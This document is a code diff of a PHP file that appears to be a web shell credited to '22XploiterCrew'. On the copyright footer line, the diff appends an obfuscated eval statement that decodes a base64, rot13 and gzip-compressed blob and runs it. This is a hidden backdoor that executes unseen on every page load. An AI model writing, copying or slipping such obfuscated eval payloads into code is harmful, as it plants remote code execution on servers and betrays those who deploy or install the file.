@@ -1679,5 +1679,5 @@ if($ext == "php") {
 			}
 		echo '</table></div><hr/>';
 		echo "<a href='' class='scrollToTop'><i class='fas fa-arrow-up up'></i></a>";
-		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://22xploitercrew.com">22XploiterCrew</a></small></center>';
+		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://22xploitercrew.com">22XploiterCrew</a></small></center>'; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 ?>
